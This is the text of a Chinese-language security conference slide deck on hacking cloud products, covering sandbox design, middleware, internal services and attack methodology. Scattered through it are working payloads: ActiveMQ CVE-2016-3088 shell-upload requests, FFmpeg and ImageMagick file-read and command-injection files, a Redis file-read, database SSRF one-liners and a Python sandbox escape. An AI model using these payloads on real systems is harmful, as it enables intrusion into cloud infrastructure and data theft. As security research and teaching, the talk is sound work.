Hacking Cloud Product
[ Demon@n0tr00t ]
探索⼀一切、攻破⼀一切
[ Hacker@KCon ]
3
About me
• Working  on  阿里云-云平台安全 
• Team  of  n0tr00t  （http://www.n0tr00t.com/） 
• ID:  Demon  (微博：Demon写Demo)  
• 跨界：摇滚乐、Coding、安全
Part. 01
分类和架构
4
5
云的基础架构
• 种类繁多 
基础服务大同小异，每家云厂商还有自己的特色云服务  
• 资源开放 
按需付费、资源开放，对于安全的说法就是可控点变多，结界难以把控，安全的天秤随时会倾斜。 
• 木桶原理 
木桶原理被放大，致弱点容易成为致命点。
6
云产品的通⽤用架构
物理集群
Server
Portal
运维管控
实例
虚拟机
用户管理
监控系统
计费系统
资源管理
运维管理
容灾系统
网关系统
逻辑服务
控制器
调度系统
生产系统
存储系统
底层云组件
API
7
云产品的安全基⽯石 - 沙箱（SandBox）
• 沙箱的结构决定了产品持久稳固性
• avoid  be  root,  use  linux  capability
• 脚本层、容器层、用户权限层  
          -脚本层：JSM、PHP  disabled  function  
          -容器层：Docker、Linux  namespace、cgroup  
          -用户权限隔离：最小权限原则
用户权限
容器层
脚本层
Part. 02
隐匿在结界内的隐患
8
9
结界的划分
结界外 
•
控制台（portal）,  用户可管理产品  
•
API服务，通过API访问操作实例方便自动化
管理实例  
•
实例本身，如连接虚拟服务
器,redis,mongodb等
暗物质 
•
未知模块，如一些额外的存储系统 
•
游离在架构之外的服务，结界不明，难以发
现 
结界内 
•
业务逻辑服务，负责业务逻辑处理 
•
调度服务，负责调配资源，控制链路  
•
生产系统，负责生产实例，或释放实例等 
•
管控系统，用于管理或监控实例 
•
其他：因架构而定，如还存在一些日志组件，
下发任务模块等等
10
过度松耦合导致的隐患 
•  十人传话游戏  
•  多层模块分离，安全职责不明
11
攻击中间件服务 
    ·∙  开源消息中间件：Kafka、ActiveMQ、RabbitMQ、OpenJMS等  
    ·∙  分布式服务框架：Dubbo、zookeeper、TAF  
攻击方式  
      ·∙  Load  eval  Mbean  via  “getMBeansFromURL”    （http://www.n0tr00t.com/2015/04/16/JMX-RMI-Exploit.html）  
      ·∙  Java  反序列化漏洞（http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/）  
      ·∙  XML实体注入、命令注入、未授权调用服务
12
Use  Java  Message  Exploitation  Tool  (JMET)  
• Apache  ActiveMQ  
• Redhat/Apache  HornetQ  
• Oracle  OpenMQ  
• IBM  WebSphereMQ  
• Pivotal  RabbitMQ  
• IIT  Software  SwiftMQ  
• Apache  ActiveMQ  Artemis  
• Apache  QPID  JMS  
• Apache  QPID  Client  
项目地址：https://github.com/matthiaskaiser/jmet  
使用方法：  
      >  java  -jar  jmet-0.1.0-all.jar  -Q  event  -I  ActiveMQ  -Y  xterm  127.0.0.1  61616
13
ActiveMQ  CVE-2016-3088
MOVE  /fileserver/shell.txt  HTTP/1.1  
Destination:  file:///usr/local/apache-activemq-5.7.0/webapps/shell.jsp  
Host:  x.x.x.x  
PUT  /fileserver/shell.txt  HTTP/1.1  
Host:  x.x.x.x  
Content-Length:  16  
14
运维管控系统  
• 管理控制实例  
• 部署发布系统  
• 状态监控系统  
• 统一配置管理系统  
安全隐患：  
• ACL绕过、API未授权调用  
• 通过XSS漏洞打入到管控系统执行任务  
• 开源的管控系统的漏洞（hue、splunk  、cacti、jekins、zabbix、zenoss、elasticsearch  ）
15
Use  hiveSQL  to  read  file
16
内部服务未授权问题  
• Redis未授权访问  
• Mongodb未授权访问  
• Rsync未授权访问  
• Memcache未授权访问
Part. 03
以点破⾯面-Hacking
17
18
云服务
19
云服务
开源服务
⾃自研服务
20
开源服务
21
开源服务
22
开源服务的脆弱点
23
•开源产品的已知安全问题
•配置、权限设置不严格导致沙箱绕过
•⺴⽹网络边界和部署存在安全问题
24
案例
25
FFmpeg:  
//exp.m3u8  
#EXTM3U  
#EXT-X-MEDIA-SEQUENCE:0  
#EXTINF:10.0,  
concat:http://xxx/test.m3u8|file:///etc/passwd    
#EXT-X-ENDLIST
ImageMagick:  
push  graphic-context  
viewbox  0  0  640  480  
fill  'url(https://example.com/image.jpg";|ls  "-la)'  
pop  graphic-context
26
27
Redis  eval指令执行dofile枚举系统目录  
$>EVAL  "return  dofile('/etc/passwd')"  0
28
• Mongodb  SSRF  
>db.copyDatabase("\nstats\nquit",'test','localhost:11211')
• Postgres  SSRF  
>SELECT  dblink_send_query('host=127.0.0.1  dbname=quit  user=\'\nstats\n\'  password=1  port=11211  
sslmode=disable','select  version();');
• CouchDB  SSRF  
POST  http://couchdb:5984/_replicate  
ContentType:  application/json  
Accept:  application/json  
{  
"source"  :  "recipes",  
"target"  :  "http://secretdb:11211/recipes",  
}
来源《SSRFbible  Cheatsheet》
29
•开源产品的已知安全问题
•配置、权限设置不严格导致沙箱绕过
•⺴⽹网络边界和部署存在安全问题
-­‐	
  FFmpeg  SSRF  &  任意文件读取  
-  ImageMagick  RCE  
-  Linux  local  privileges  escape  
-  CVE  ….
-  python沙箱绕过  
-  php  bypass  disable_functions  
-  redis  执行lua脚本枚举服务器文件  
-  mysql、mssql  危险函数或存储扩展未禁用
-（MSSQL、Mongodb、Postgres、CouchDB）  SSRF  
-  云服务控制系统(接口)暴露在公网  
30
⾃自研服务
31
“宇宙就是⼀一座⿊黑暗森林，每个⽂文明都是带枪的猎⼈人，像幽灵般潜⾏行
于林间，任何暴露⾃自⼰己坐标的⽣生命都将很快被消灭。”	
  ——《三体II	
  ⿊黑暗森林》
32
宇宙	
  =	
  ⺴⽹网络
⽂文明	
  =	
  系统(服务)
33
云服务
server1
server2
server3
serverN
隐匿在云环境下的脆弱⺫⽬目标
34
云服务
server1
server2
server3
serverN
隐匿在云环境下的脆弱⺫⽬目标
35
server3
隐匿在云环境下的脆弱⺫⽬目标
36
server3
隐匿在云环境下的脆弱⺫⽬目标
server1
server2
server4
server5
serverN
37
攻击⽅方式
• 从进程、⺴⽹网络流量、端⼝口中找寻agent的相关信息	
• 定位agent的坐标	
• 对agent实施安全测试	
• 对agent坐标同⺴⽹网络段下的系统进⾏行测试
38
案例
39
某云⼚厂商RPC组件任意代码执⾏行
40
某云⼚厂商RPC组件任意代码执⾏行
41
产品本⾝身
42
利⽤用产品本⾝身功能收集内⺴⽹网IP坐标信息：	
• 负载均衡的健康检查机器	
• 云安全扫描	
• 云监控的请求⽇日志	
• 浏览器测试类产品的请求⽇日志	
43
借⽤用实例⺴⽹网络环境访问内部组件：	
• 回源功能（CDN、云WAF）	
• 域名解析+组合服务（产品服务	
  -­‐>域名	
  -­‐>内⺴⽹网IP）	
• ⺴⽹网络代理、回调（API⺴⽹网关、云通信、移动端⺴⽹网络接⼊入服务）	
• 消息推送（移动消息推送、视频直播流推送）	
44
⽂文件处理属性相关产品
⽂文件读取、解压软链接⽂文件
命令执⾏行、沙箱绕过
SSRF
python沙箱绕过  
>>> [].__class__.__base__.__subclasses__()[58].__init__.func_globals['linecache'].__dict__.values()[14] 
45
云服务
⺫⽬目标禁⽌止外连怎么办？
攻击者
服务器A
命令执⾏行、⽂文件读取
服务器A禁⽌止外连
其他云产品实例
私
⺴⽹网
其他云产品实例：RDS、redis、app	
  engine等，通过私⺴⽹网环境向实例透出数据
攻击者连接实例读取数据
46
在内部能做什么
47
流量监控
寻找特权AK
批量⽣生产实例
控制集群
48
总结：How	
  to	
  hack
49
总结：How	
  to	
  hack：	
• 阅读公开⽂文档、架构⽂文档、操作⼿手册，了解产品功能和架构模块	
• 研究实例的⺴⽹网络环境与组件间调⽤用关系	
• 寻找组件中可能使⽤用到的开源组件列表	
• 结合功能和⽀支持的协议分析⻛风险点	
• ⼤大量测试，Find	
  vulnerable	
THANKS
[ Demon@KCon ]